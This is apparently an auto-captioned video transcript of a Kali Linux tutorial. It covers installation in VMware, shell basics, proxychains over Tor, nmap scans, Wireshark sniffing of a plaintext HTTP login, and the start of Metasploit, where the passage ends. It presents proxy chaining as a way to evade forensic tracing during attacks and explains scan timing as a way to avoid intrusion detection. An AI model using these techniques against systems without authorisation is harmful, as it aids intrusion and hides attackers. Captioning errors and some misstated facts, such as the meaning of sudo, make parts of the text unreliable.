hey everyone it's no secret that the
majority of our internet usage set the
risk of being hacked be it via unsafe
messaging applications or misconfigured
operating systems
to counteract this void of digital
security penetration testing has become
the knob when it comes to vulnerability
assessment Kali Linux is an operating
system that has become a well-known
weapon in this fight against hackers a
Linux distribution that is made
specifically for penetration testers
Kali Linux has layers of features that
we will be covering in today's lesson
let's take a look at the topics to be
covered in this video
we start by learning about Kali Linux
and a basic explanation of its purpose
we take a look at the history of Kali
Linux from the story of its origin to
its current day exploits
next we learn a few distinct features of
Kali that make it an attractive choice
for penetration testers worldwide
finally we take a look at the multiple
ways we can install Kali Linux to start
a journey in the world of penetration
testing
let's start by learning about Kali Linux
in general
Kali Linux which is formerly known as
backtrack Linux is an open source Linux
distribution aimed at Advanced
penetration testing and security
auditing
it contains several hundred tools that
are targeted towards various information
security tasks such as penetration
testing security research computer
forensics and reverse engineering
column Linux is a multiple platform
solution accessible and freely available
to Information Security Professionals
and hobbyists
among all the Linux distributions Kylie
Linux takes its routes from the Debian
operating system Debian has been a
highly dependable and stable
distribution for many years providing a
similarly strong Foundation to the Kali
desktop
while the operating system is capable of
practically modifying every single part
of our installation the networking
components of Kali become disabled by
default this is done to prevent any
external factors from affecting the
installation procedure which may pose a
risk in critical environments apart from
boosting security it allows the deeper
element of control to the most
enthusiastic of users
we did not get Kali Linux since the
first day how did it come into existence
let's take a look at some of its history
Linux is based on years of knowledge and
experience in building penetration
testing and operating systems during all
these project lifelines there have been
only a few different developers as the
team has always been small the first
project was called wapix which stands
for white hat knopex as can be inferred
from the name it was based on the nopex
operating system as its underlying OS
Opex had releases ranging from version
2.0 to 2.7
this made way for the next project which
was known as wax or the long hand being
white hat slacks the name change was
because the base OS was changed from
nopics to slacks wax started at version
3 as a Nord at carrying on from mop X
there was a similar OS being produced at
the same time auditor security
collection often being shorted to just
auditor which was once again using
nopics
its efforts were combined with wax to
produce backtrack backtrack was based on
slackware from version 1 to version 3
but switched to Ubuntu later on with
version 4 to version 5. using the
experience gained from all of this Kal
Linux came after backtrack in 2013. Kali
started off using Debian stable as the
engine under the hood before moving to
Debian testing when Kali Linux became a
rolling operating system
now that we understand the history and
the purpose of Kali Linux let us learn a
little more about its distinct features
the latest version of Kali comes with
more than 600 penetration tools
pre-installed after reviewing every tool
that was included in backtrack
developers have eliminated a great
number of tools that either simply did
not work or which duplicated other tools
that provided the same or similar
functionality
the Kali Linux team is made up of a
small group of individuals who are the
only ones trusted to commit packages and
interact with the repositories all of
which is done using multiple secure
protocols restricting access of critical
code bases to external asset greatly
reduces the risk of source contamination
which can cause Kali Linux users
worldwide a great deal of damage as a
direct victim of cybercrime
although penetration tools tend to be
written in English the developers have
ensured that Kali includes true
multilingual support allowing more users
to operate in their native language and
locate the tools they need for the job
the more comfortable a user feels with
the intricacies of the operating system
the easier it is to maintain a
stronghold over the configuration and
the device in general
since arm-based single board systems
like the Raspberry Pi are becoming more
and more prevalent and inexpensive the
development team knew that kali's arm
support would need to be as robust as
they could manage with fully working
installations
Linux is available on a wide range of
arm devices and has arm repositories
integrated with the mainland
distributions so the tools for arm are
updated in conjunction with the rest of
the distribution
all this information is necessary for
users to determine if Kali Linux is the
correct choice for them if it is what
are the ways that they can go forward
with this installation and start their
penetration testing Journey
the first way to use Kali Linux is by
launching the distribution in the live
USB mode this can be achieved by
downloading the installer image file or
the ISO file from the Kalin Linux
website and flashing it to a USB drive
with a capacity of at least 8 GB
some people don't need to save their
data permanently and a live USB is the
perfect solution for such cases after
the iso image is flashed the thumb drive
can be used to boot a fully working
installation of the operating system
with the caviar that any changes made to
the OS in this mode are not written
permanently some cases allow persistent
usage in live USBS but those require
further configuration than normal
situations
but what if the user wants to store data
permanently in the installed OS the best
and the most reliable way to ensure this
is the full-fledged hardness
installation this will ensure the
complete usage of the system's Hardware
capabilities and will take into account
the updates and the configurations being
made to the OS this method is supposed
to override any pre-existing operating
system installed on the computer be it
windows or any other variant of Linux
the next alternative route for
installing Kali Linux would be to use
virtualization software such as VMware
or virtualbox the software will be
installed as a separate application on
an already existing OS and Kali Linux
can be run as an operating system in the
same computer as a window
the hardware requirements will be
completely customizable starting with
the allotted Ram to the virtual hard
disk capacity
the usage of both a host and guest
operating system like car Linux allows
users a safe environment to learn while
not putting the systems at risk if you
want to learn more about how one can go
forward with this method we have a
dedicated video where Kali Linux is
being installed on VMware while running
on a Windows 10 operating system you can
find the link in the description box to
get started with your very own virtual
machine
the final way to install Kali Linux is
by using a dual boot system to put it in
simple words the Kali Linux OS will not
be overrating any pre-installed
operating system on a machine but will
be installed alongside it when a
computer boots up the user will get a
choice to boot into either of these
operating systems many people prefer to
keep both the windows and Kali Linux
installed so the distribution of work
and recreational activities is also
allotted effectively it gives users a
safety valve should their custom Linux
installation run into any bugs that
cannot be fixed from within the
operating system
there are multiple ways to install color
Linux we can either install it on a
normal hard drive in a virtual machine
software such as VMware or virtualbox or
we can do that in hardware metal
machines now for the convenience of
explanation we're going to install Kali
Linux today on a virtual machine
software known as VMware
VMware is able to run multiple operating
systems on a single host machine which
in our case is a Windows 10 system
to get started with Kali Linux
installation we have to go to the
website to download an image file
we go to get Kali
and as you can see there are multiple
platforms on which this operating system
can be inverted as per our requirement
we're going to go with the virtual
machine section as you can see it is
already recommended by the Developers
this is the download button which will
download a 64-bit ISO file we can
download 32-bit but that is more
necessary for hard metal machines or if
you're going to use it for older devices
which do not support 64-bit operating
systems yet
after clicking on the download button
we can see we have a WinRAR archive
which will have the ISO files
for now we have downloaded the ISO file
and it is already present with me so we
can start working on the VMS side of
things
once the ISO file is downloaded we open
up VMware Workstation
go to file
and we create a new virtual machine
in these two options it is highly
recommended to go with the typical setup
rather than the custom one the custom is
much more advanced and requires much
more information from the user which is
beneficial for developers and people who
are well versed with virtualization
software but from 90 of the cases
typical setup will be enough
here we can select the third option
which will be I will install the
operating system later and some
operating systems we can use the ISO
file here directly and VMware will
install it for us but for right now in
the case of Kali Linux the third option
is always the safest
color Linux is a Linux distribution so
we can select Linux over here and the
version as you can see here it have
multiple versions such as the multiple
kernels
every distribution has of a parent
distribution for example color Linux has
Debian and there are other distributions
which are based or forked from some
parent distribution colleges is based
off Debian so we can go with the highest
version of Debian which is the Debian
10.x 64-bit
go on next we can write any such name we
can write Kali Linux so that it will be
easier to recognize the virtual machine
among this list of virtual machine
instances the location can be any
location you decide to put by default it
should be the documents folder but
anywhere you put it will hold up all the
information rig of the operating system
all the files you download all the
configurations you store everything will
be stored in this particular location
that you provide
when we go next
we are asked about the disk capacity
this disk capacity will be all the
storage that will be provided to your
virtual machine of Cal Linux think of
your Windows device if you have a one
terabyte of hard drive you have the
entirety of the hard disk to store data
on how much data you give here you can
only store up to that amount of data not
to mention some amount of capacity will
be taken up by the operating system
itself to store its programs and
applications
for now we can give around let's say 15
GB of information or if it's recommended
size for Debian is 20 you can just go
ahead at 20. it depends all on the user
case if you are going to use it
extensively you can even go as high as
50 or 60 GB if you have plans to
download many more applications and
perform multiple different tests
another option we get over here is
storing virtual disks as a single file
or storing them into multiple files
as we already know this virtual machine
run entirely on VMware
sometimes when transferring these
virtual machine instances let's say from
a personal computer to a work computer
you're going to need to copy up the
entire folder that we had mentioned
before over here
instead all virtual machines have a
portability feature now this portability
feature is possible
for all scenarios except it is much
easier if the split the virtual disk
into multiple files now even if this
makes importing virtual machines easier
from either system to system or software
to software let's say if you want to
switch from VMware to virtualbox or vice
versa the performance takes a small hit
it's not huge but it's recommended to go
with storing the virtual disk as a
single file if you have no purposes of
ever moving the virtual machine even if
you do it's not a complete stop that it
cannot be ported it's just easier when
using multiple files but in order to get
the best performance out of the virtual
machine we can store it as a single file
over here
this is a summary of all the changes
that we made and all the configurations
that have been settled until now now at
this point of time we have not provided
the dot ISO file yet which is the
installation file for the Kali Linux
that we downloaded from this website
as of right now we have only configured
the settings of the virtual machine so
we can press on finish
and we have Kali Linux in the list now
to make the changes further we press on
edit virtual machine settings
the memory is supposed to give the ram
of the virtual machine
the devices with ram of 8 GB odds below
that giving high amount of ram will
cause performance issues and the host
system
if the memory has some amount of free
storage left let's say on idle storage
my Windows machine takes about 2GB so I
have 6 GB of memory to provide although
if you provide all of the 6gb it will be
much more difficult for the host system
to run everything properly so for this
instance we can keep it as 2GB of memory
for the virtual machine instance
similarly we can use the number of
processors and we can customize it
according to our liking let's say if you
want to use One processor but we want to
use two different cores we can select
them as well
hard disk is pre-set up as the SCSI hard
disk and it does not need to be changed
for the installation of this operating
system at all
cdid DVD this is where the installation
file comes
you can think of the ISO file that we
downloaded as a pen drive or a USB thumb
drive which is necessary to install an
operating system to provide this
we're going to select use ISO image file
we're going to click on browse
go on go to downloads and select the Im
so file over here
select open
and you can see it is already loaded up
next in the network adapter it is
recommended to use Nat this helps the
virtual machine to draw the internet
from the host machine settings if your
host machine is connected to the
internet then the virtual machine is
connected as well there are some other
options such as host only or custom
segments or Lan segments but those are
not necessary for installation
rest of them are pretty standard which
do not need any extra configuration and
can be left as it is
press OK and now we can power on this
virtual machine
in this screen we can choose how we want
to proceed with the installation
we have a start installer option over
here
so we're going to press enter on that
we're going to wait for the things to
load from the ISO file
the first step in the installation is
choosing the language of the operating
system
for this we can go with English as
standard
this is a location this will be used for
setting up the time and some of the
internal settings which depend entirely
on the location of the user so for this
we're going to go with India
configuring the keyboard it's always
recommended to go with the American
English first many people make a mistake
of going with the Indian keyboard if it
is possible and it provides a lot of
issues later on so it's always prefer to
go with the American English and if
later we see some necessity of another
keyboard dialect adaptiveness required
we can install it later but for now we
should always stick with American
English as a basic
at this point it's going to load the
installation components from the dot ISO
file it is a big file of 3.6 GB so it
has a lot of components that need to be
put into the virtual machine which can
also be used to detect Hardware
once the hardware and the network
configuration is done by the ISO file we
want to write a hostname for the system
this hostname can be anything which is
used to recognize this device on a local
network or a lan cable let's say if we
use the name Kali
domain name you we can skip it for now
it's not necessary as such for the
installation
this is the full name for the user
let's say we can provide the name as
simply learn as a full name
next you're going to set up a username
this username is going to be necessary
to identify the user from its use root
accounts and the subsequent below
accounts for now we can give it as
something as simply one two three
now we have to choose a password for the
user now remember since this is the
first user that is being added onto this
newly installed operating system it
needs to be a password for the
administrator
we can use whichever password we like
over here
and use the same password below and
press on continue
at this point it's going to detect on
the components on which the operating
system can be installed
like here there are multiple options
like the use entire disk use entire disk
and setup lvm this entire disc concept
of encrypted lvm for newcomers it is
recommended to just use the first one
since lvm encryption is something that
we can learn afterwards when you are
much more Hands-On with the Linux
operating system for now we're going to
use the use entire disk guided
installation and press on continue
when we set up the virtual machine on
VMware we had set up a disk capacity
there we gave our preposter 20 GB that
is the hardest which is being discovered
here even though it is a virtual disk on
VMware it acts as a normal hard disk on
which an operating system can be
installed so we select this one and
press on continue
here there is a multiple partition
system
all the operating systems that are
installed have different components one
is used for the keeping of the
applications one for the files other for
the RAM management and other things for
newcomers it is always recommended to
keep it in one partition
and we're going to select that and press
on continue
this is just an overview of the
partition it's going to make as you can
see it has a primary partition of 20.4
GB and a logical partition of 1GB used
for swap memory now these kind of naming
can be confusing for people who are not
well versed with Linux operating systems
or in general virtualization but for now
you can go ahead and press on continue
as this will be fine
we can press on finish partitioning and
write changes to disk and continue
it's just a confirmation page as you can
see it showed that SCSI 3 is our virtual
hard disk of 20 GB disk capacity
we write the changes to the disk we
press yes and click on continue
at this point the installation has
started now this installation will take
a while depending on the num amount of
ram provided the processors provided and
how quickly the performance of the
system is being hampered by the host
machine on quicker systems this will be
rather quick while on the smaller ones
this will take a while
since this is going to take some time to
install as it is being run on a virtual
machine with only 2GB of RAM we're going
to speed up this part of the video so we
don't have to waste any more time just
watching the progress bar
now that our core installation is
completed it's asking us to configure a
package manager the work of a package
manager on Linux operating system is
similar to the Google Play Store on
Android mobile devices and on the app
store for the Apple devices
it's an interface to install external
applications which are not installed by
default let's say for Google Chrome or
any other browser which can be used to
browse the internet
at this point of time is ask us to
select our Network mirror we're going to
select as yes and move forward with this
next
it's going to ask us for a HTTP proxy
which we can leave it as blank and press
it as continue forward
at this point of time it's looking for
updates to the Kali Linux installation
this will fetch the new builds from the
Kali server so the installation is
always updated to the latest version
now that the package manager is
configured we have the grub bootloader
the grub is used for selecting the
operating system while booting up its
core functionality is to allow the
operating system to be loaded correctly
without any faults so at this point of
time if it has installed the grub
bootloader to your primary dive we can
select this as yes and press continue
remember the installation was conducted
on dev SDA
so we're going to select installation of
the Guard loader on the same hard disk
that we have configured
we press this one and press continue
so now the grub bootloader is being
installed
the grub is highly essential because it
is it shows the motherboard where to
start the operating system from even if
the operating system is installed
correctly and all the files are in
correct order the absence of a
bootloader will not be able to launch
the OS properly
as you can see the installation is
finally complete so now we can press on
continue
and it's going to finalize the changes
now you can see Carl Linux being booted
up straight away it doesn't check for
the ISO file anymore since the operating
system is now installed onto the virtual
hard disk storage that we had configured
before
here we're going to enter our username
and password that we had set up before
and we have the calendar system booted
up
and this is your home page
we can see the installed applications
over here which are being used for
penetration testing by multiple security
analysts worldwide
all of these come pre-installed with
Carl Linux and others can be installed
using the APD package manager that we
had configured
we can see a full name over here
and with this our installation of the
Kali Linux is complete
now that we have covered the basics of
Kali Linux let us take a look at the
agenda for our demo today
we start out with a few terminal
commands that are a basic part of a
Linux operating system
configure our own proxy chains to
maintain anonymity while running
penetration testing attacks on our
victims
next we run a few nmap scans on a local
Windows 10 machine to find out the type
of information that can be gathered in
such a scenario
moving on we use Wireshark to monitor
internet traffic and understand the
importance of encryption and security
when browsing the World Wide Web
next we learn about Metasploit and its
various applications in the line of
vulnerability assessment of a device
and finally we use mataseproid to take
root access of a fully updated Windows
10 computer system
let's begin with some terminal Basics on
Kali Linux
when most people hear the thumb Linux
they Envision a complex operating system
used only by programmers however the
experience is not as frightening as it
appears Linux is an umbrella term for a
collection of free and open source Unix
operating systems there are many
variants like Ubuntu Fedora Debian these
are distributions which will be a more
precise term when using a Linux
operating system you will most likely
utilize a shell which is a command line
interface that provides access to the
operating system Services the majority
of Linux distributions ship with a
graphical user interface also known as
GUI as their primary shell this is done
to facilitate user interaction in the
first place having said that a command
line interface is suggested due to its
increased power and Effectiveness by
entering the commands into the CLI tasks
that require a multi-step GUI procedure
may be completed in a matter of seconds
you can start the terminal by clicking
on the prompt icon here on top
once the terminal is open
we can put up a commands the First
Command that we are going to look into
is PWD PWD stands for present working
directory
as of right now what you are seeing is
the terminal window by default if I
write PWD and press enter this shows the
directory in which the terminal is being
run on as of right now it's in the NF
folder of my desktop which is
specifically this folder if I open up
this folder you can see it is currently
empty as in it has no contents
if I use another command known as mkdir
which is supposed to stand for make
directory and I write an F2 shortage for
new folder 2.
if I open up the NF you can see the new
folder is created
this is how the PWD command works
another important command
to change directories it's called the CD
command let's say right now if I am in
NF I want to create a new file in nf2
folder or something else in the nf2
folder I have to shift to CD nf2
now if I write PWD
it will show the present working
directory of Home simply learn desktop
NF and inside that I am in nf2 right now
it is done to navigate through the Linux
files and disk directories it requires
either the full path or just the name of
the directory if we have to move a
completely different folder on a
completely different file then we can
use the entire path like this
for now CD Works another few commands is
we can write CD dot dot and it will come
back one folder now the PWD will be just
NF and not nf2
let's say we are in this folder and we
want to go a different file let's say if
we just go for CD
home
simpler
that's it
right now these are the folders in our
current present working directory
we have the desktop the documents
downloads Etc
from here we can again go to the desktop
using the same CD command
cross check the changing of directories
and check the files again and yes there
we go NF how do we know this what are
the command that we are used to show the
files and folders that folder is known
as the ls command LS can be used to view
the contents of a directory by default
this command will display the contents
of your current working directory if we
add some other parameters we can find
the contents of other directories as
well
there are some hidden files as well in
Linux which cannot be showed just with
ls for example if we just go to cdetc
which is a configuration folder for
Linux if we write LS now these are the
files that can be seen
if you want to see the hidden files
we'll have to add one more parameter
here like LS minus a and as you can see
the number of files have increased this
time around
there are other things as well that we
can see with Linux
LS minus a l will show the hidden files
along with some of the parameters and
some of the permissions that has been
provided for each file
as you can see many of these files have
root access some of them can write some
of them can read
it differs file to file and the ls minus
Al command is used to check each of
these files permission and change them
accordingly if needed
the next command that we can look for is
the cat command or concatenate
it is one of the most frequently used
commands and it is used to list the
contents of a file on the output
for example
let's say if I have a file at the
desktop
in this nf2 folder I will create a
document
create an empty file
e file
I'll open up the document
and I'll write it as
hello Kali
I will save this up
now to change the directories from Etc
to nf2 we have already discussed how to
use the CD command using just the folder
name now if you want to go through the
entire directory we can write CD
home
as you can see it is already prompting
us to complete the name of the directory
at this point we just have to press tab
and it completes it for ourselves next
we already know we have to enter the
desktop
NF and nf2
and this brings us to the current
working directory here if we press LS we
can find a file over here now as
discussed with the concatenate it is
used to show the contents of a file so
right now if we press cat which stands
for concatenate
e file
as you can see we have written hello
Kali in the text file and we can see the
output right now
we can also use it to create new files
for example if we write cat
any file name such as e-file 2.
here we can write anything
hello Kali again
once you press Ctrl C here we can check
e File 2 and we have hello Kali again
printed over here we can see the same
using the concatenate command as well if
I press LS you can see we have two files
here and I can go with cat e file to
and I have Hello Kali again this is how
the concatenate command works
apart from this it can be used to copy
there is a different command like called
CP which is used to copy the files from
one place to another mindfulness is not
moving this is only going to copy the
command for example currently our PWD
which is the present [__] directory
is in the nf2 folder as you can see over
here
let's copy the E file to to the NF
folder
we can write CP
e file to
and give the path of the NF folder which
will be home
simply learn
Tech stock
and an F
now if I press LS I'll find both the
files in nf2 since I copied
to go back to the NF folder again we can
again use the same command of
no we can again use the home
simply learn
desktop
and just an F no nf2 this time just
enough
as you can see this will change back our
present working directory now when we
press LS we will find the e-file to file
and the nf2 folder and we can confirm
this using the GUI as well
this is the NF folder and you can see
the nf2 folder and the e-file to
document if I write cat e file to
cat e file to
we can see the contents of the file now
this can be done using moving as well
for example if I go to CD nf2 which is
the inside folder it has both the
document files like e file and e-file 2.
let's say I want to move the e-file
completely from nf2 to NF1 instead of
writing CP the command I am going to use
is MV MV e file and again give the path
of the folder into which I have to copy
which will be again home
simply learn
desktop
and NF
as you can see the contents of the nf2
have appeared here and E file has been
moved
from nf2 to
NF
this is this nf2 and we don't find e
file here anymore if we press CD dot dot
and we go back to NF LS right now and we
can file both the files e file that we
moved and E file to that we copied from
the nf2 folder so this is how copying
and moving will work using the terminal
now this is just a simple one line
statement that might take a couple of
clicks when using GUI this is why the
command line interface is considered to
be much more streamlined for Linux
operating systems
another very important command for Linux
operating system is the sudo command
Sudo is short for super user dupe the
command enables you to perform tasks
that require administrative or root
permissions you can think of it as how
we run programs administrator on Windows
systems it is not advisable to use this
cupboard for daily use because it might
be easy for an error to occur and the
permissions of root are very intricate
so new beginners are advise to use this
sudo command only when absolutely
necessary for example
sudo SU
with this command I am giving this
terminal a root permission
this SEO stands for this user
at this point it's going to ask for my
admin password
once I enter my password
and I now have root access note how the
password that I entered did not show up
here this is a security measure to
prevent people from snooping on your
root password which is the end game of
all this operating system
as you also can see the symbol changed
if the dollar symbol is showing it
source as a standard user when you
switch to root you can easily see a hash
symbol
this opens up a
shell inside this terminal command for
example we can exit out of the root user
to the standard user using the command
exit and once again we have the dollar
sign and the root has vanished over here
there are some commands that will only
work with administrative access for
example when updating the Kali Linux
system we have to use apt update
as you can see it says problem unlinking
the file because permission denied now
let's try this using sudo
sudo APD update
as you can see it is updating the
package repositories which work as the
software installed on the system
this can be done using either writing
the sudo command every time we want to
perform a root access or we can just
write sudo Su once and write apt update
alone
the fetching is complete over here
for the second example let's say I just
write sudo Su and this time it's not
going to ask me the password because at
this current terminal process I've
already provided the root password once
and it is in memory right now now when
we used to update the system we had to
write sudo apt update that was because
we were running it as a standard user
now we are running it as a root user so
all we have to write is if it update and
it's going to continue its work
there you go
another command that can be useful is
the Ping command pretty self-explanatory
it's going to be checking the internet
connectivity you can be used to check
internet connectivity or you can see if
there is a local server on your system
which needs to be pinged then you can
check there for example if you have to
write ping and we can use either IP
address or domain let's say if you want
to check that if we can access
google.com using this Kali Linux
installation or not we can write ping
google.com
and you can see it shows the bytes being
sent and received and how much time it
took to take up the request
this can be done for local systems as
well for example this installation of
Kali Linux is being run on a virtual
machine
once this machine is running I still
have my host machine running over here
the IP address of which is
192.168.29 179.
if I try to Ping this from here
as you can see the time to complete the
request is drastically low compared to a
website on the internet considering this
is on the local network
this is how the Ping command is worked
and it can show you what kind of
packages are transmitted how many are
received if there was any kind of packet
loss between the connection window and
other details
a very important command when working
with the terminal for long duration is a
history command
it is self-explanatory there are so many
commands that are being run sometimes
people forget what was the change they
did oh what was the directory name they
put a history command helps to recover
some of the commands that you have
written it doesn't go all the way back
but it takes up many commands that were
inputted in the last few processes
this is how the history command works
these are some of the most commonly used
terminal commands if you want to learn
more about this terminal and every other
feature of this please let us know in
the comment section and we will try to
make an in-depth tutorial special
figures
repeat if you want to learn more about
the terminal please let us know in the
comment section and we will try to make
an in-depth tutorial specifically for
terminal commands on Linux
moving on we learn how to configure
proxy chains on a system
proxying refers to the technique of
bouncing your internet traffic through
multiple machines to hide the identity
of the original machine it is a good
tool that hackers use to accomplish this
goal is proxy chains
essentially you can use proxy chains to
run any program through a proxy server
this will allow you to access internet
from behind a restrictive firewall which
hides your IP address
even allows you to use multiple proxies
At Once by chaining them together
one of the most important reasons that
proxy chains is used in a security
context is that it's easy to evade
detection attackers often use proxies to
hide their true identities while
executing an attack
and when multiple proxies are chained
together it becomes harder and harder
for forensic professional to trace the
traffic back to the original machine
when these proxies are located across
countries investigators would have to
obtain warranties in the local
jurisdictions where every proxy is
located
to see how proxygen works let's open
Firefox first and check our current IP
address
write Firefox
and there we go
as we can see Firefox is now open
let's check our current IP address right
now
if we go to an address called my
ip.com
and you can see it easily detects our
country is in India and this is a public
IP address
now if we move to the terminal again
here we can now write
proxy chains
minus h
what is minus H does is it finds a help
it it stands for the help file this is
for help file
what we found out using this is proxy
chains has a config file here
Etc
proxychains4.conf this is the config
file found using this config file we can
customize how our proxy change should
work
if we want to open that we have to use
it in a text editor on Windows we have
notepad and other things like that
Microsoft Word related documents on
Linux we have a tool called Nano to
access the Nano we use the command Nano
and give the path of the file that we
want to check as of right now the proxy
chance config file is located over here
so we're going to follow the path there
chains 4 Dot comf
and here we go we see the config file
there are three basic types of proxy
chaining here
we have a strict chain where all the
proxy in the list
will be used and they will be changed in
order we have a random chain where each
connection made through proxy genes will
be done via random combo proxies in the
proxy list
when you have a dynamic chain it's the
same as strict chain but dead proxies
are excluded from the chain
and here we can set up whichever type we
want
to enable or disable a particular type
we use the hash symbol here as you can
see right now all the lines have a
hashtag symbol at the front except this
one a dynamic chain this is the current
one being used let's say if I want to
use a strict chain method so I can add a
hash value here
and remove the hash here at one point of
time any one of these three four types
should be enabled
let's go for the Dynam Dynamic chain
we can disable this strict Chain by
putting the hashtag in front
and removing the dynamic chain
as you can see below we have few
commands to how to handle the Nano text
editor this symbol is known as the
control button on your keyboard now if
we want to write out which is synonymous
to saving the file
supposed to go with Ctrl O So if I press
Ctrl o on my keyboard it says file name
to write and we have to press enter here
since we want to overwrite the proxy
chains 4 dot comf file we don't want to
create a new file over here so just
press enter
and we get a permission right this
permission denied we're getting is
because we have opened this using a
standard user Etc is a system folder to
be able to use make some changes we have
to use it using a sudo command to exit
this Nano we have to use the control X
command we use Ctrl X
we're going to clear
and this time we're going to use the
sudo command
sudo Nano
Etc
proxy chains
4.0
and we have the same file open up again
now this time if you want to make a
change let's say we're going to add a
strict chain instead of a dynamic chain
which remove the hashtag from straight
we're going to use Ctrl o for the save
file option we're going to press enter
and it says root 160 lines
again if you want to reverse this change
we put the hashtag over here
enable Dynamic chain
we press Ctrl o
press enter and it says root 160 lines
now we can exit straight away using the
control X format
right now we have not provided any file
or a proxy chain we can have proxy IP
addresses from the internet but we have
to make sure that they are safe and they
don't Snoop on our data
when there is no proxy chains being
provided personally it going it's going
to use the Tor Network but for that we
have to start door
is a service in Linux to know more about
the store we can write sudo systemctl
which is used to know the status of
services on the Linux operating system
and status of torque
a system CTL sorry as instead of STL it
should be system CTL status Tor as you
can see it is a toss service anonymizing
overlay Network for TCP connections and
it's currently inactive now to start
this up we have to write sudo system CTL
start
Dot now if we repeat the same sudo
system CTL status Star as you can see
it's active now
you can see the green logo over here
okay
to integrate the Firefox and the browser
we can use the proxy chains command
directly over here we can write proxy
chains we can use Firefox to launch our
web browser and let's say if we want to
visit google.com
we press enter
and the Firefox window is launched
and it should open up google.com next
and there we go
if we go to myip.com once again
as you can see we have a different IP
address and the country is a known as
well
so this is how we can use proxy chains
to anonymize a internet usage when using
Kali Linux
next on our agenda is the ability to
scan networks using nmap
at its core nmap is a network scanning
tool that uses IP packets to identify
all the devices connected to a network
can learn more about nmap using their
help file
as you can see these are some of the
parameters that can be used when
scanning ports of a system you can see
the version and the URL of the webs of
the service
over here the primary users of nmap can
be broken into three Crow processors
first the program gives you detailed
information on every IP active on your
network and then each IPA can then be
scanned
secondly it can also be used to
providing a lot of live hosts and open
ports as well as identifying the OS of
every connected device
thirdly
and map has also become a valuable tool
for users looking to protect personal
and business websites
using nmap to scan your own web server
particularly if you are hosting your
website from home is essentially
simulating the process that a hacker
would use to attack your site attacking
your own site in this way is a powerful
way of identifying security
vulnerabilities
as we already discussed The Host Windows
10 machine on the system has an IP
address a 192 168 29.179
if you want to test the OS scan of the
system we're going to first get the root
permission over here
we use the sudo command and now we are a
root user we're going to launch the
command and map
minus o which is supposed to be an OS
detection scan the IP address we can use
of the host system
192.168.29.179
in a legitimate penetration testing
scenario we can use the IP address of
the vulnerable disk device over here
we are going to let it scan for a while
and it's going to give us some guesses
on what can the OS be
as you can see the scan is done and it
has shown some of the ports that are
open
you can see the msrpc port open at the
https 443 Port open which is used to
connect to the internet and it has some
aggressive OS guesses as well for
example it thinks there's a 90 94 chance
that it's going to be a Microsoft
Windows XP Service Pack 3. that's partly
because a lot of the Windows XP update
packages are still prevalent on Windows
now that the OS detection is confirmed
there are multiple more details that we
can gather from nmap
let's go with the NF minus a command
which is supposed to capture as much
data as possible
there is also a speed setting you can
call it a speed setting or a control
setting of the minus t
minus t ranges from t 0 to T1 to T
through all the way up to D5
this basically determines how
aggressively the victim is being scanned
if you scan slowly it will take more
time to provide the results but it will
also give a less chance for the
intrusion detection system on the
vulnerable machine firewall to detect
that someone is trying to penetrate the
network for now if we want to go with
somewhat of a high speed we can go with
the T4 and provide the same IP address
of the local machine I am trying to
attack
it's going to take a little bit of time
since it's trying to capture a lot of
information
as you can see the results are now
here
it launched a scan and took a few top
ports that are most likely vulnerable
from a Windows XP perspective and it
showed
a few ports over here it has not shown
991 filtered ports which could not be
attacked anyway since they were closed
for outside access it shows a few
fingerprint settings like the connection
policies and the port details
it shows an HTTP options some other
intricate details that can be used when
you attacking its servers
it shows a VMware version that it's
running
and some few other ports over here
apart from that we also have the
aggressive OS gases over here just like
we did with the minus o and you can see
this time it is showing Windows 7 as 98
percent
no exactos matches since uh if there was
any exact wise matches we could have
seen 100 chances over here
this is a trace route a trace route will
be the time and the path a connection
request takes from the source to the
destination for example this request
went from 192
168.72.2 to a destination address since
this is a local machine it took only a
single step and multiple occasions so if
you're trying to access a remote system
it's going to be a number of free suits
when it jumps from firewall to firewall
and router to router
this is how we can use nmap to find
information about a system and find some
vulnerable ports we can access
moving on we have a tutorial on how to
use Wireshark to sniff Network traffic
to start using Wireshark we're going to
have to open the application first now
during installation of Wireshark there
is an option to enable if non-root users
can be able to capture traffic or not in
my installation I have disabled that so
I will be launching Wireshark when using
the root user itself
also to capture data we need an external
Wi-Fi adapter
you can see it over here in the VM tab
removable devices
our link 802.1 and WLAN
this is a external Wi-Fi adapter which
is inserted into my USB system
you can see it over here if I write
iwconfig
this is the one wlan0 this is absolutely
necessary because we need to have a
monitor mode required we won't need it
for sniffing data on Wireshark right now
but it's going to be necessary later on
in this tutorial as well as we will see
for now we can just start up Wireshark
by writing its name on the command line
and it should start the program
here we go
here it's going to check which of the
adapters we want to use for example
right now the eth0 which supposed to
stand for ethernet 0 Port you can see
data is being transmitted up and down
we're going to select eth0
and we have started capturing data you
can see this data request from the
source so destination and the time and
the which protocol it is following
everything we can see and we can see the
ipv4 flags here as well
as you can see over here
to capture internet traffic
we can try running Firefox
if we just write Wikipedia
.com
and you can see the number of requests
increasing
okay this is spelling mistake Wikipedia
yeah
you can see the application data of all
these requests going up
and they're connected to a destination
server of 1 0 through 102.166.224
now if you even if you check the
transmission control protocol Flags over
here and so many more things we cannot
find anything beneficial as you can see
the information over here is gibberish
which is supposed to be since it's
supposed to be encrypted
now
this is possible due to this being an
https website hence you can see the lock
symbol over here and connection is
supposed to be secure
now what about HTTP ports we have seen
many people recommend to not visit HTTP
ports
repeat
we have seen many people recommend to
not visit HTTP websites and even if we
have to visit to not provide any
critical information
for example let's go to a random
HTTP page over here
as you can see this is
saying connection is not secure and this
is an HTTP HTTP page and not https
now let's check for some of the
information that is passing through this
this is a login form let's say I have a
legitimate account over here
if I write my account name
and my password is supposed to be
password one two three four
I press login
and the password does not match because
I do not have an account over here but
let's say I did and I was logged in as
expected you can go to Wireshark
we can use filters over here now all the
requests that I am sending it's a TCP
request so I can write a filter
containing TCP
contains
whatever string if it is being passed
let's say for the end user name I write
my account name
so I can just write my account name over
here
and press enter
to find a request over here now as you
can see
there are many flags over here
if we go to the HTT HTML form URL
encoded and open up some of its Flags
as you can see I can see my account name
and simply learn password over here this
is the same
details that I input on the website
let's say I did have a legitimate
account on this website I would have
logged in with no problems but anyone
who would be using Wireshark to sniff on
the data can easily get my credentials
from here this is why it's recommended
to not provide any information on HTTP
Pages the security is not up to the mark
and always look for the lock symbol when
visiting any website or making any
internet transactions or providing any
information
this is how we can use Wireshark to
detect transmission and sniff packet
data that is being transferred to the
network adapter
next we have to learn about what is
Metasploit
the Metasploit project is a computer
security project that provides
information about security
vulnerabilities and AIDS in penetration
testing and IDs development
we can open up the terminal here we're
going to allow root access
and to open up Metasploit the key word
is msf console
that's going to take a little bit of
